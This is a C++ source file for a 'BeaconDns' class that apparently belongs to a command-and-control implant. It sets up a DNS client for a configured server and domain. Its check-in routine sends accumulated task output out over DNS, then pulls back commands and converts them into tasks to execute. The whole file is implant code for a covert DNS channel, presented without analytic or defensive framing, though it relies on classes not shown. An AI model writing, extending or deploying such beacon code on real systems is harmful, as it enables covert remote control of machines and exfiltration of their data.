#include "BeaconDns.hpp"
#include <client.hpp>


using namespace std;
using namespace dns;


BeaconDns::BeaconDns(std::string& config, const std::string& dnsServer,
                     const std::string& domain, int port)
    : Beacon()
{
    // beacon and modules config
    initConfig(config);
    
    m_client=new Client(dnsServer, domain, port);
}


BeaconDns::~BeaconDns()
{
    delete m_client;
}


void BeaconDns::checkIn()
{    
    SPDLOG_DEBUG("initConnection");

    if (m_pendingOutput.empty())
        taskResultsToCmd(m_pendingOutput);

    SPDLOG_DEBUG("sending output.size {0}", std::to_string(m_pendingOutput.size()));

    if (!m_client->sendMessage(m_pendingOutput))
        return;

    m_pendingOutput.clear();

    std::string input = m_client->requestMessage();

    if(!input.empty())
    {
        SPDLOG_DEBUG("received input.size {0}", std::to_string(input.size()));
        cmdToTasks(input);
    }
}

    



